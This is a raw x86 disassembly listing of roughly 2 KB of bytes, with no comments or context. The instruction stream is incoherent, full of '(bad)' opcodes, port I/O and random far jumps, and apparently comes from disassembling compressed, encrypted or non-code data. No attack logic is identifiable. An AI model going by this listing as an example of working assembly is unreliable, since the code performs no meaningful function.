  480149:	fist   DWORD PTR [eax+0x2d]
  48014c:	adc    DWORD PTR [ecx],ebx
  48014e:	test   DWORD PTR [ecx-0x36cc4fee],ebp
  480154:	sub    eax,0x2d6e22c3
  480159:	xchg   ebp,eax
  48015a:	ins    DWORD PTR es:[edi],dx
  48015b:	(bad)  
  48015c:	fistp  WORD PTR [eax-0x29]
  48015f:	sar    eax,1
  480161:	in     eax,dx
  480162:	jne    0x4801b4
  480164:	lea    esi,[eax-0x30]
  480167:	mov    esp,0x6501ec7
  48016c:	fisttp DWORD PTR [ecx-0x28c30fbf]
  480172:	shl    DWORD PTR [ecx],cl
  480174:	setb   BYTE PTR [eax]
  480177:	xor    edx,DWORD PTR [edi+0x50]
  48017a:	jge    0x48019e
  48017c:	inc    BYTE PTR [edi-0x14e40c09]
  480182:	add    al,0xa
  480184:	sbb    al,0x5
  480186:	lea    ecx,[ebp-0x4c]
  480189:	mov    dl,BYTE PTR [ebp-0xd]
  48018c:	xor    DWORD PTR [ebx+0x33],ecx
  48018f:	mov    edi,0x458d744a
  480194:	ret    
  480195:	outs   dx,DWORD PTR ds:[esi]
  480196:	cmp    ebx,DWORD PTR [edx+0x1a]
  480199:	ficomp WORD PTR [edx-0x61d0a2eb]
  48019f:	fcom   DWORD PTR [esi-0x5c]
  4801a2:	xchg   BYTE PTR [ebx-0x3d],cl
  4801a5:	inc    ebx
  4801a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4801a7:	add    BYTE PTR [esi-0x23],bh
  4801aa:	pushf  
  4801ab:	sub    DWORD PTR [edx+0x51],ebp
  4801ae:	push   0xa0961216
  4801b3:	cmp    eax,0x60ecc130
  4801b8:	mov    al,ds:0x45b37e9f
  4801bd:	adc    BYTE PTR [eax],cl
  4801bf:	jg     0x4801e7
  4801c1:	es je  0x48016e
  4801c4:	mov    edx,0xe80d8a04
  4801c9:	dec    ecx
  4801ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4801cb:	xor    ecx,DWORD PTR [eax-0x30eedc3f]
  4801d1:	imul   BYTE PTR [edx-0x1d]
  4801d4:	dec    esp
  4801d5:	sar    edx,1
  4801d7:	sar    BYTE PTR [ebx],0x1c
  4801da:	sbb    edi,esi
  4801dc:	rol    BYTE PTR [eax],cl
  4801de:	dec    edx
  4801df:	mov    ecx,DWORD PTR [ebx+0x48]
  4801e2:	add    eax,0x42ff393d
  4801e7:	push   es
  4801e8:	xchg   BYTE PTR [esi+esi*1],dh
  4801eb:	add    al,0xe7
  4801ed:	mov    edx,0xc15f8f7c
  4801f2:	pop    ss
  4801f3:	jmp    0xe34ebebc
  4801f8:	mov    ecx,eax
  4801fa:	pushf  
  4801fb:	ja     0x4801f3
  4801fd:	imul   edi,DWORD PTR [edi],0x38
  480200:	test   DWORD PTR [ecx-0x14b8ef46],edx
  480206:	or     eax,0xcf6506ba
  48020b:	and    DWORD PTR ds:0x9898a803,eax
  480211:	or     BYTE PTR [edx+0x44],bl
  480214:	mov    ds:0x26f06b38,al
  480219:	cs into 
  48021b:	out    0xaa,eax
  48021d:	and    eax,DWORD PTR [ebx+0x3ece1a43]
  480223:	and    ebp,ebx
  480225:	aas    
  480226:	das    
  480227:	mov    BYTE PTR [eax+0x6],dl
  48022a:	test   ah,bh
  48022c:	enter  0xa238,0x84
  480230:	mov    edi,0x5aeb66c9
  480235:	sub    eax,edx
  480237:	dec    BYTE PTR [esi+0x73c05b84]
  48023d:	retf   
  48023e:	push   edi
  48023f:	lea    esi,[ebp-0x78]
  480242:	lea    edi,[ebp-0x1d]
  480245:	sbb    al,0x26
  480247:	sbb    BYTE PTR [eax+0x5f],bh
  48024a:	xor    DWORD PTR [ebx],eax
  48024c:	pop    ds
  48024d:	and    ebp,DWORD PTR [ecx+0xda50d85]
  480253:	mov    edx,0x78e90e4e
  480258:	sar    eax,1
  48025a:	add    BYTE PTR [eax+0x4ec37295],0x14
  480261:	imul   BYTE PTR [ebx]
  480263:	test   DWORD PTR [ecx],ebx
  480265:	lock mov dh,0xf4
  480268:	sub    BYTE PTR ds:0x5ca22859,al
  48026e:	inc    eax
  48026f:	ficomp WORD PTR [ebp-0x3d]
  480272:	push   esi
  480273:	nop
  480274:	push   0x78
  480276:	sbb    DWORD PTR [edx+esi*1],eax
  480279:	and    bl,al
  48027b:	popf   
  48027c:	je     0x4802f2
  48027e:	cmp    al,0x73
  480280:	or     BYTE PTR [eax+0x4b84f52d],ch
  480286:	and    DWORD PTR [ebp-0x5d],ebx
  480289:	add    al,0x9f
  48028b:	cwde   
  48028c:	and    eax,0xf9bae46a
  480291:	mov    al,ds:0xd411eaa4
  480296:	sar    cl,1
  480298:	(bad)  
  480299:	push   edi
  48029a:	(bad)  
  48029b:	es pop eax
  48029d:	adc    DWORD PTR [edi-0x1b3cb759],0x1d
  4802a4:	push   ecx
  4802a5:	jp     0x48022c
  4802a7:	cwde   
  4802a8:	cld    
  4802a9:	mov    ds:0xfc7ad93b,eax
  4802ae:	data16 fild DWORD PTR [edi+eiz*2]
  4802b2:	test   BYTE PTR [esi-0x74b7c781],al
  4802b8:	pop    ds
  4802b9:	sub    edi,DWORD PTR [eax+0x69731074]
  4802bf:	mov    esp,0x841efdc7
  4802c4:	fadd   QWORD PTR [edi+0xc]
  4802c7:	test   eax,0xe0582396
  4802cc:	xor    BYTE PTR [edx-0x7e66bf3d],dl
  4802d2:	test   edi,ebx
  4802d4:	dec    esp
  4802d5:	jecxz  0x4802f7
  4802d7:	(bad)  
  4802d8:	cmp    edi,DWORD PTR [ecx+ebp*2+0x2d]
  4802dc:	fsub   DWORD PTR [ecx+0x5b14db7d]
  4802e2:	daa    
  4802e3:	sbb    BYTE PTR [edx+0x74],bl
  4802e6:	xor    eax,0xc537c08b
  4802eb:	and    DWORD PTR [eax+0x72],esp
  4802ee:	dec    edx
  4802ef:	dec    eax
  4802f0:	pop    es
  4802f1:	rcl    BYTE PTR [edi],0x43
  4802f4:	cmp    BYTE PTR [ebx],al
  4802f6:	jbe    0x4802e6
  4802f8:	push   eax
  4802f9:	or     eax,DWORD PTR ds:0x21f0865c
  4802ff:	xchg   ebx,eax
  480300:	jl     0x480299
  480302:	inc    ecx
  480303:	adc    esi,eax
  480305:	xchg   BYTE PTR [ebp+0x3],ch
  480308:	add    DWORD PTR [esi+esi*2+0x700c0170],edx
  48030f:	xor    esi,DWORD PTR [eax+ecx*8-0x9]
  480313:	(bad)  
  480315:	pop    fs
  480317:	pusha  
  480318:	jbe    0x480311
  48031a:	shl    BYTE PTR [ebx],1
  48031c:	jp     0x48029e
  48031e:	jmp    0x48032c
  480320:	popf   
  480321:	pusha  
  480322:	shr    BYTE PTR [eax],1
  480324:	inc    ebp
  480325:	add    DWORD PTR ds:0x2ac38034,0x8d075a20
  48032f:	ret    
  480330:	jo     0x480362
  480332:	call   0x2439:0xcee3f15f
  480339:	xor    eax,0x904e8790
  48033e:	push   0x44
  480340:	ins    DWORD PTR es:[edi],dx
  480341:	mov    ah,0xf7
  480343:	(bad)  
  480344:	or     esi,DWORD PTR [ebp+ebp*1-0x2d]
  480348:	sbb    dl,BYTE PTR [esi-0x15968f5a]
  48034e:	jo     0x48036e
  480350:	aas    
  480351:	fs adc eax,0x7526e703
  480357:	push   ss
  480358:	xchg   esp,eax
  480359:	jne    0x4803d9
  48035b:	jmp    0x4803ce
  48035d:	popf   
  48035e:	cmp    esp,esp
  480360:	test   BYTE PTR [ebp+0x6754d6c],bl
  480366:	or     esi,0xcf4581f
  48036c:	or     ebp,esi
  48036e:	stos   DWORD PTR es:[edi],eax
  48036f:	add    BYTE PTR [eax-0x77],ah
  480372:	pop    DWORD PTR [eax]
  480374:	xchg   ecx,eax
  480375:	add    DWORD PTR [ecx],esp
  480377:	jne    0x35be5803
  48037d:	add    eax,0x47555773
  480382:	into   
  480383:	xor    BYTE PTR [esi+0xbaf10c4],ch
  480389:	mov    cs,WORD PTR [eax]
  48038b:	adc    al,BYTE PTR [esi]
  48038d:	push   esi
  48038e:	sbb    esp,edi
  480390:	push   esi
  480391:	sub    edi,DWORD PTR [edx-0x75]
  480394:	cmp    DWORD PTR [ebp+0x41],ecx
  480397:	fcomip st,st(6)
  480399:	and    BYTE PTR [eax+ebp*2-0x7d],ah
  48039d:	adc    bl,ch
  48039f:	and    eax,0xc71e424d
  4803a4:	add    BYTE PTR [edi+0x215687d5],ah
  4803aa:	xchg   edx,eax
  4803ab:	adc    eax,0x8bb8ace7
  4803b0:	lahf   
  4803b1:	push   es
  4803b2:	(bad)  
  4803b4:	or     dh,BYTE PTR [ebx-0x7be0a96f]
  4803ba:	pop    esi
  4803bb:	adc    edi,DWORD PTR [edx+0x52]
  4803be:	sub    eax,DWORD PTR [ebx-0x3f]
  4803c1:	clc    
  4803c2:	push   ds
  4803c3:	xchg   ecx,eax
  4803c4:	inc    esi
  4803c5:	pop    edx
  4803c6:	adc    eax,ebp
  4803c8:	jg     0x480429
  4803ca:	or     bh,BYTE PTR [eax+ebx*4+0x20]
  4803ce:	rcl    DWORD PTR ds:0x60c83ec6,0xb2
  4803d5:	add    DWORD PTR [ebx],edi
  4803d7:	(bad)  
  4803d8:	in     eax,dx
  4803d9:	and    BYTE PTR [ebx-0x7cf9c42c],cl
  4803df:	outs   dx,DWORD PTR ds:[esi]
  4803e0:	jmp    0xa0bce353
  4803e5:	cs cmp al,0x45
  4803e8:	sbb    BYTE PTR [eax+0x45],ch
  4803eb:	push   cs
  4803ec:	or     edi,0x40
  4803ef:	daa    
  4803f0:	ins    BYTE PTR es:[edi],dx
  4803f1:	dec    ebx
  4803f2:	lds    ecx,FWORD PTR [edi+0x53]
  4803f5:	or     edx,DWORD PTR [eax]
  4803f7:	movzx  edi,di
  4803fa:	ins    BYTE PTR es:[edi],dx
  4803fb:	outs   dx,BYTE PTR ds:[esi]
  4803fc:	add    eax,esp
  4803fe:	inc    ebx
  4803ff:	aam    0x5f
  480401:	push   edi
  480402:	test   al,0x38
  480404:	mov    edi,edi
  480406:	pop    edx
  480407:	mov    dh,0xe1
  480409:	mov    ecx,edi
  48040b:	or     ecx,0x5b29c6bb
  480411:	pop    edx
  480412:	shr    ch,1
  480414:	(bad)  
  480415:	pop    ebx
  480416:	adc    DWORD PTR [eax-0x40],0xc
  48041a:	test   BYTE PTR [eax],al
  48041c:	or     al,BYTE PTR [edi+0x9]
  48041f:	cs inc esp
  480421:	cmp    ah,BYTE PTR [eax+0x7b]
  480424:	add    al,0x2f
  480426:	jge    0x480443
  480428:	sbb    ebp,DWORD PTR [ebx]
  48042a:	mov    ch,0x83
  48042c:	shl    DWORD PTR [edx-0x19],0x39
  480430:	cs iret 
  480432:	xchg   ecx,eax
  480433:	scas   al,BYTE PTR es:[edi]
  480434:	sub    BYTE PTR [ecx],ah
  480436:	mov    esp,gs
  480438:	inc    DWORD PTR [esi]
  48043a:	and    bl,ch
  48043c:	fwait
  48043d:	pop    ecx
  48043e:	sbb    eax,0xf8c73924
  480443:	and    al,0x34
  480445:	int    0x3f
  480447:	in     al,dx
  480448:	ds sbb al,0xa7
  48044b:	inc    ebx
  48044c:	push   esp
  48044d:	xchg   ecx,eax
  48044e:	mov    al,ds:0xdbf38b4
  480453:	ret    0x2120
  480456:	sub    BYTE PTR [ebp+0x32],dh
  480459:	in     eax,dx
  48045a:	push   ss
  48045b:	xchg   ecx,eax
  48045c:	cmp    DWORD PTR [ecx+0x7b],0xffffffe1
  480460:	adc    eax,0x874145ad
  480465:	sbb    ecx,esp
  480467:	add    al,0xa1
  480469:	inc    eax
  48046a:	jns    0x480450
  48046c:	add    BYTE PTR [edi-0x5de3baf4],al
  480472:	inc    eax
  480473:	sbb    BYTE PTR [ecx+0x56],al
  480476:	or     al,0xd8
  480478:	leave  
  480479:	jno    0x48048e
  48047b:	scas   eax,DWORD PTR es:[edi]
  48047c:	and    al,0x90
  48047e:	jbe    0x480434
  480480:	addr16 jno 0x48040e
  480483:	pop    edi
  480484:	mov    ds:0x40b4fdc0,eax
  480489:	js     0x4804f7
  48048b:	mov    BYTE PTR [esp],al
  48048e:	push   esi
  48048f:	ret    
  480490:	es aam 0x74
  480493:	sbb    BYTE PTR [edx-0x3e1353c],bh
  480499:	mov    al,0xf4
  48049b:	mov    ah,0x3e
  48049d:	inc    edi
  48049e:	dec    eax
  48049f:	loopne 0x4804aa
  4804a1:	add    esp,DWORD PTR [esi]
  4804a3:	mov    ah,0x79
  4804a5:	iret   
  4804a6:	repnz or dl,BYTE PTR [eax+0x8]
  4804aa:	adc    DWORD PTR [edi+0x44],ecx
  4804ad:	imul   edx,DWORD PTR [ecx+0x4f],0x67
  4804b1:	push   ebx
  4804b2:	xchg   ebx,eax
  4804b3:	test   bl,ah
  4804b5:	xchg   ebx,eax
  4804b6:	ja     0x4804af
  4804b8:	xchg   ebx,eax
  4804b9:	or     DWORD PTR [edi+0x3a],ecx
  4804bc:	xchg   esi,eax
  4804bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4804be:	je     0x4804cd
  4804c0:	mov    BYTE PTR [edi],cl
  4804c2:	or     ebx,DWORD PTR [eax]
  4804c4:	pop    edi
  4804c5:	mov    dh,BYTE PTR [esi+0x3d]
  4804c8:	dec    esi
  4804c9:	or     eax,0x56e0caaf
  4804ce:	cmp    dl,BYTE PTR [eax+0xf8858b5]
  4804d4:	adc    ebx,ebx
  4804d6:	add    al,0xe1
  4804d8:	das    
  4804d9:	test   BYTE PTR ss:[eax+0x50],0x40
  4804de:	adc    BYTE PTR [ecx+eax*1],dh
  4804e1:	push   ss
  4804e2:	arpl   WORD PTR [ecx+0x67],bx
  4804e5:	jmp    0x8b8c9573
  4804ea:	in     al,0x98
  4804ec:	mov    cl,0x20
  4804ee:	pop    ds
  4804ef:	scas   eax,DWORD PTR es:[edi]
  4804f0:	jo     0x48052a
  4804f2:	inc    ecx
  4804f3:	and    eax,0x64c770e4
  4804f8:	xlat   BYTE PTR ds:[ebx]
  4804f9:	stos   DWORD PTR es:[edi],eax
  4804fa:	stc    
  4804fb:	add    bh,BYTE PTR [edx+0x4]
  4804fe:	and    eax,0x8a846220
  480503:	je     0x480572
  480505:	out    dx,eax
  480506:	mov    ebx,0x190b1d0b
  48050b:	jae    0x4804db
  48050d:	mov    BYTE PTR [ebx+0x6ca06bcf],dl
  480513:	inc    edi
  480514:	mov    edi,0x95a7f76e
  480519:	nop
  48051a:	outs   dx,BYTE PTR ds:[esi]
  48051b:	aam    0x3a
  48051d:	xchg   edi,eax
  48051e:	outs   dx,DWORD PTR ds:[esi]
  48051f:	cmp    DWORD PTR [edi-0x6f],esp
  480522:	push   cs
  480523:	outs   dx,DWORD PTR ds:[esi]
  480524:	sbb    BYTE PTR [eax+0x14c75b0f],cl
  48052a:	dec    edi
  48052b:	push   ss
  48052c:	mov    ah,0xa4
  48052e:	test   BYTE PTR [esi-0x178607ce],al
  480534:	inc    DWORD PTR [edx]
  480536:	icebp  
  480537:	xor    BYTE PTR [eax],dl
  480539:	cmp    esi,DWORD PTR [edi+0x5f4226a1]
  48053f:	or     ch,dl
  480541:	mov    DWORD PTR [edi+0x47167768],eax
  480547:	sbb    dh,BYTE PTR [eax+0x56c42fe9]
  48054d:	pop    es
  48054e:	or     al,0x1e
  480550:	jne    0x48056a
  480552:	es jp  0x4805c6
  480555:	loopne 0x480571
  480557:	push   ecx
  480558:	nop
  480559:	dec    edi
  48055a:	mov    ebp,0x8747888b
  48055f:	pop    ebx
  480560:	fnstsw WORD PTR [ebx+0x754c768]
  480566:	xchg   BYTE PTR [eax],al
  480568:	inc    edi
  480569:	retf   
  48056a:	dec    ecx
  48056b:	pop    ebp
  48056c:	inc    eax
  48056d:	mov    ecx,eax
  48056f:	add    edi,esi
  480571:	adc    BYTE PTR [esi],ah
  480573:	mov    ebx,DWORD PTR [ebx-0xcfe6a93]
  480579:	rcl    esp,0x11
  48057c:	ffreep st(4)
  48057e:	inc    edx
  48057f:	enter  0xcaa3,0x9b
  480583:	ffree  st(4)
  480585:	mov    ebp,DWORD PTR [esi]
  480587:	add    eax,0x1927071f
  48058c:	xchg   esp,eax
  48058d:	data16 sbb BYTE PTR [edx+0x74e3900e],al
  480594:	cmp    DWORD PTR [edx+0x74],ecx
  480597:	test   BYTE PTR [esi-0x37],cl
  48059a:	xor    ebp,esp
  48059c:	mov    ah,0xbc
  48059e:	push   ss
  48059f:	inc    edi
  4805a0:	lods   al,BYTE PTR ds:[esi]
  4805a1:	jp     0x480567
  4805a3:	and    ebp,0x8f787c32
  4805a9:	dec    ecx
  4805aa:	sbb    bl,BYTE PTR [edx]
  4805ac:	aas    
  4805ad:	and    DWORD PTR [ecx+eiz*4+0x60],edi
  4805b1:	jno    0x480545
  4805b3:	faddp  st(2),st
  4805b5:	or     al,0x3c
  4805b7:	test   al,0xb4
  4805b9:	xchg   edx,eax
  4805ba:	mov    ch,0x8
  4805bc:	mov    eax,ds:0x990d8cb8
  4805c1:	in     al,0x7
  4805c3:	scas   eax,DWORD PTR es:[edi]
  4805c4:	jns    0x4805df
  4805c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4805c7:	js     0x48057f
  4805c9:	jnp    0x480637
  4805cb:	jns    0x480633
  4805cd:	nop
  4805ce:	mov    eax,DWORD PTR [edx]
  4805d0:	(bad)  
  4805d1:	and    al,0xf4
  4805d3:	xor    dh,BYTE PTR [edx]
  4805d5:	sar    BYTE PTR [esi+0xf0c0124],cl
  4805db:	adc    BYTE PTR [ecx],dl
  4805dd:	mov    ebp,0xb186b642
  4805e2:	and    DWORD PTR [eax],0xffffffa8
  4805e5:	add    ah,BYTE PTR [eax+edx*4-0xf]
  4805e9:	add    BYTE PTR [ebp+0x21634a4f],dh
  4805ef:	push   esi
  4805f0:	push   esi
  4805f1:	push   0xbb7171c5
  4805f6:	adc    edi,DWORD PTR [ecx+0x60]
  4805f9:	sub    bh,al
  4805fb:	fdivr  QWORD PTR [edi+0xf880b74]
  480601:	(bad)  
  480603:	push   es
  480604:	fild   QWORD PTR [edx+eax*4-0x6cc5001c]
  48060b:	sti    
  48060c:	je     0x480622
  48060e:	mov    BYTE PTR [edi],cl
  480610:	shr    BYTE PTR [esi],cl
  480612:	jle    0x4805fb
  480614:	ins    DWORD PTR es:[edi],dx
  480615:	xor    BYTE PTR [ebx+0x39],bh
  480618:	cld    
  480619:	imul   DWORD PTR [esi+0x13]
  48061c:	in     al,0xa4
  48061e:	jge    0x48068e
  480620:	comiss xmm0,xmm3
  480623:	adc    DWORD PTR es:[ecx],edx
  480626:	mov    edi,0xff367bb7
  48062b:	cmp    esi,DWORD PTR [ebx-0x76e2ccf8]
  480631:	jg     0x688f669e
  480637:	and    BYTE PTR [edx],al
  480639:	pop    edi
  48063a:	(bad)  
  48063b:	mov    eax,DWORD PTR [eax+0x6e]
  48063e:	pop    ss
  48063f:	cwde   
  480640:	enter  0x121f,0x87
  480644:	adc    ah,BYTE PTR [ebx+0xc]
  480647:	sar    BYTE PTR [ebp-0x10],cl
  48064a:	mov    bl,BYTE PTR [esi+0x1bc67315]
  480650:	dec    esp
  480651:	xor    dh,BYTE PTR [eax-0x47973e5c]
  480657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  480658:	(bad)  
  480659:	mov    ds:0x579e6510,al
  48065e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48065f:	scas   eax,DWORD PTR es:[edi]
  480660:	std    
  480661:	or     DWORD PTR [ecx+0x541c67d9],ebx
  480667:	push   eax
  480668:	push   0x7bc269b9
  48066d:	mov    eax,ds:0xc1885e6d
  480672:	out    dx,eax
  480673:	rcl    BYTE PTR [eax],1
  480675:	in     al,0x44
  480677:	ja     0x4806e6
  480679:	mov    fs,WORD PTR [ecx*1+0x6f2077dc]
  480680:	xchg   DWORD PTR [ecx-0x78],ecx
  480683:	xchg   ebx,eax
  480684:	or     eax,0x2983ab38
  480689:	mov    al,0xa2
  48068b:	rcl    al,1
  48068d:	mov    dl,0xcc
  48068f:	leave  
  480690:	test   eax,0x89d9a23c
  480695:	dec    edi
  480696:	mov    edx,eax
  480698:	and    DWORD PTR [edi+ebx*2],edi
  48069b:	je     0x48062b
  48069d:	mov    eax,ds:0x5b94a329
  4806a2:	(bad)  
  4806a3:	cdq    
  4806a4:	xor    BYTE PTR [edi-0x10f161c5],0x2a
  4806ab:	mov    BYTE PTR [edi],cl
  4806ad:	fwait
  4806ae:	sbb    DWORD PTR [ebx-0x30f9b52a],ebx
  4806b4:	or     ch,BYTE PTR [esi-0x5e983f93]
  4806ba:	sub    BYTE PTR [eax+0x4840d150],dh
  4806c0:	pop    es
  4806c1:	and    BYTE PTR [edx-0x2e],al
  4806c4:	xor    DWORD PTR [esi+0x34],edx
  4806c7:	mov    cl,0x42
  4806c9:	in     al,dx
  4806ca:	lods   eax,DWORD PTR ds:[esi]
  4806cb:	rol    DWORD PTR [edi],0x87
  4806ce:	xchg   ecx,eax
  4806cf:	fwait
  4806d0:	cmp    BYTE PTR [edx-0x14d4d30c],dh
  4806d6:	xor    BYTE PTR [esi],cl
  4806d8:	mov    ah,0x35
  4806da:	aas    
  4806db:	add    esi,DWORD PTR gs:[eax+ecx*2]
  4806df:	in     eax,dx
  4806e0:	jne    0x480680
  4806e2:	sti    
  4806e3:	jae    0x480735
  4806e5:	or     ebx,edi
  4806e7:	xor    al,0x64
  4806e9:	mov    eax,ds:0x2bb7b5bd
  4806ee:	enter  0x38c2,0xd8
  4806f2:	xlat   BYTE PTR ds:[bx]
  4806f4:	push   0x35428fa4
  4806f9:	shr    ch,0x0
  4806fc:	jmp    0x3a7eb013
  480701:	mov    eax,ds:0x481a4ab0
  480706:	out    dx,eax
  480707:	jmp    0x480787
  480709:	in     eax,dx
  48070a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48070b:	inc    edi
  48070c:	jnp    0x4806de
  48070e:	push   ebx
  48070f:	lock pop ss
  480711:	pop    edi
  480712:	sub    BYTE PTR [eax+0x398ecc33],ah
  480718:	sti    
  480719:	aam    0x59
  48071b:	xor    BYTE PTR [eax+0x4b494084],ah
  480721:	add    DWORD PTR [ecx-0x6fb1d6ed],0x77ff3185
  48072b:	dec    eax
  48072c:	test   eax,0xe455b91c
  480731:	cmp    edi,DWORD PTR [ebp-0x8]
  480734:	jg     0x48073a
  480736:	dec    edi
  480737:	jo     0x4806cf
  480739:	test   DWORD PTR [ebx-0x21dbf577],esi
  48073f:	arpl   WORD PTR [eax+0x791b0626],ax
  480745:	jno    0x4807af
  480747:	xchg   edx,eax
  480748:	jne    0x480705
  48074a:	push   ebp
  48074b:	jle    0x4807c0
  48074d:	mov    fs:0xc25aa60a,eax
  480753:	lahf   
  480754:	cli    
  480755:	xor    DWORD PTR [ebx-0x1c],ebp
  480758:	rol    ecx,0x19
  48075b:	dec    ebx
  48075c:	int3   
  48075d:	(bad)  
  48075e:	xchg   esi,eax
  48075f:	add    al,BYTE PTR [edx+0x21]
  480762:	inc    ebx
  480763:	push   esi
  480764:	pop    esp
  480765:	push   edx
  480766:	mov    ecx,0xeefc4f08
  48076b:	cld    
  48076c:	inc    edi
  48076d:	push   es
  48076e:	es xchg esp,edi
  480771:	mov    ecx,0x8445524
  480776:	jo     0x48078f
  480778:	xchg   esi,eax
  480779:	retf   
  48077a:	adc    DWORD PTR [ebx+esi*8-0x3a030ac1],esp
  480781:	dec    eax
  480782:	adc    al,0x36
  480784:	imul   ebp,DWORD PTR [edi],0x695776d4
  48078a:	mov    BYTE PTR [ecx+0x1b5491b0],bh
  480790:	xor    eax,0xc451f512
  480795:	or     eax,0x3a8a8fc0
  48079a:	lods   eax,DWORD PTR ds:[esi]
  48079b:	ret    0x4f7f
  48079e:	or     eax,DWORD PTR [edx*4-0x447f41f8]
  4807a5:	sbb    DWORD PTR [eax],eax
  4807a7:	popf   
  4807a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4807a9:	sub    BYTE PTR [edx+0x2604c212],0x20
  4807b0:	fs in  al,0x36
  4807b3:	rol    BYTE PTR [ebp+0xe],cl
  4807b6:	sub    BYTE PTR ds:0xe4673013,bl
  4807bc:	fs in  al,0x11
  4807bf:	cmp    al,0x12
  4807c1:	inc    esp
  4807c2:	cmp    esi,DWORD PTR [esp+ecx*1]
  4807c5:	mov    al,0x89
  4807c7:	int3   
  4807c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4807c9:	and    BYTE PTR [edi-0x4ff10edc],ah
  4807cf:	pop    ss
  4807d0:	adc    BYTE PTR [ecx+0x75],al
  4807d3:	push   cs
  4807d4:	and    DWORD PTR [esi+0x8],0x66fd53d
  4807db:	jg     0x4807dc
  4807dd:	or     DWORD PTR [esi+0x8],0x44458300
  4807e4:	dec    ecx
  4807e5:	sbb    eax,0x56624cf4
  4807ea:	(bad)  
  4807eb:	fcomp  DWORD PTR gs:[edx+0x13034a38]
  4807f2:	inc    edi
  4807f3:	test   BYTE PTR [edi],cl
  4807f5:	(bad)  
  4807f6:	pop    ss
  4807f7:	xor    eax,0x42f63d74
  4807fc:	add    eax,0xbe377408
  480801:	cld    
  480802:	mov    ecx,0x82591a23
  480807:	adc    ebx,ebx
  480809:	xor    edi,esi
  48080b:	cmp    eax,0x5ef0ecd0
  480810:	aam    0x65
  480812:	add    esi,DWORD PTR ds:0x7d3c2283
  480818:	call   0xda89:0xd36ba870
  48081f:	mov    dh,0x73
  480821:	mov    ds:0xc04307eb,eax
  480826:	mov    WORD PTR [eax],es
  480828:	cld    
  480829:	rol    al,1
  48082b:	je     0x48081c
  48082d:	push   ecx
  48082e:	ins    DWORD PTR es:[edi],dx
  48082f:	mov    BYTE PTR [eax+0x5b206814],0x18
  480836:	aaa    
  480837:	daa    
  480838:	addr16 xchg edx,eax
  48083a:	in     al,dx
  48083b:	mov    ds,WORD PTR [ecx+0x6e1bfc82]
  480841:	xor    al,0x59
  480843:	sub    bl,0xb0
  480846:	jo     0x480848
  480848:	lds    edx,FWORD PTR [eax-0x11fc9038]
  48084e:	dec    esp
  48084f:	adc    BYTE PTR ds:0x15908a26,dh
  480855:	js     0x48080f
  480857:	(bad)  
  480858:	mov    edx,DWORD PTR [esi-0x475b4b83]
  48085e:	retf   
  48085f:	call   0x22a84aac
  480864:	xor    al,0x65
  480866:	sbb    ah,0xaa
  480869:	outs   dx,BYTE PTR ds:[esi]
  48086a:	add    eax,0x1a49d203
  48086f:	mov    ebx,0x7c0b08ad
  480874:	inc    DWORD PTR [esp+edi*2-0x3d5e7c78]
  48087b:	add    BYTE PTR [ebx+0x2f378dc1],ah
  480881:	loop   0x4808c4
  480883:	sub    bl,BYTE PTR [ebx]
  480885:	mov    edx,0x141d020f
  48088a:	mov    eax,ds:0xece07b20
  48088f:	add    edx,esi
  480891:	inc    ebx
  480892:	push   eax
  480893:	mov    DWORD PTR [esi+edx*2],eax
  480896:	in     al,dx
  480897:	push   esi
  480898:	js     0x480914
  48089a:	inc    edx
  48089b:	cmp    al,0x27
  48089d:	outs   dx,BYTE PTR ds:[esi]
  48089e:	sub    edi,eax
  4808a0:	add    al,dl
  4808a2:	or     ecx,edx
  4808a4:	int3   
  4808a5:	ja     0x480837
  4808a7:	dec    edx
  4808a8:	add    ecx,DWORD PTR [esi+ecx*4-0x7fdcebb1]
  4808af:	inc    esp
  4808b0:	push   0x7c4c0a6
  4808b5:	and    DWORD PTR [edi+0x38],0xcec8958a
  4808bc:	sbb    DWORD PTR [eax-0x382ad8a9],eax
  4808c2:	ror    BYTE PTR [edx+0x47],0x3e
  4808c6:	and    al,BYTE PTR [eax+0x70bb07be]
  4808cc:	or     BYTE PTR [ebp-0x5d],bh
  4808cf:	mov    esi,edx
  4808d1:	push   es
  4808d2:	lock push es
  4808d4:	adc    BYTE PTR [ebx-0x8c81280],cl
  4808da:	jmp    0x480892
  4808dc:	call   0x139b8a91
  4808e1:	test   al,0x90
  4808e3:	lds    edx,FWORD PTR [eax]
  4808e5:	sub    eax,DWORD PTR ss:[eax+0x2e331c02]
  4808ec:	test   ebx,ebx
  4808ee:	rcr    DWORD PTR [edi-0x74],0xdb
  4808f2:	faddp  st(3),st
  4808f4:	add    eax,ecx
  4808f6:	sti    
  4808f7:	add    al,BYTE PTR [ebx]
  4808f9:	ret    
  4808fa:	rcl    BYTE PTR [edx+eax*2+0x3],1
  4808fe:	shl    DWORD PTR [ecx+0x51],cl
  480901:	nop
  480902:	or     ebx,eax
  480904:	cmp    dh,BYTE PTR [eax+0x4a]
  480907:	jae    0x480899
  480909:	int    0x57
  48090b:	mov    bh,0x2
  48090d:	clc    
  48090e:	ins    BYTE PTR es:[edi],dx
  48090f:	sbb    al,BYTE PTR [edx]
  480911:	sbb    al,0x2
  480913:	mov    dh,ah
  480915:	and    ebp,0x926f0218
  48091b:	call   0x12a9e185
  480920:	jmp    0xb6b1:0x9d0a125d
  480927:	mov    ds:0x2b384083,al
  48092c:	sbb    BYTE PTR [ebx-0x5c],ch
  48092f:	mov    ch,0x70
  480931:	xor    edx,edx
  480933:	mov    BYTE PTR [edi],cl
  480935:	out    dx,al
  480936:	aas    
  480937:	aam    0x1f
  480939:	push   cs
  48093a:	dec    edx
  48093b:	call   0x9638ca5e
  480940:	sub    DWORD PTR [edx+0x24],ebp
  480943:	out    dx,eax
  480944:	(bad)  
  480945:	jo     0x4808d1
  480947:	call   0xd368:0x394c4a8
  48094e:	ins    BYTE PTR es:[edi],dx
  48094f:	add    eax,0x1f690542
  480954:	ja     0x480963
  480956:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  480958:	push   0xa453ffc3
  48095d:	and    edi,DWORD PTR ds:0xff5ee2fd
  480963:	pop    ecx
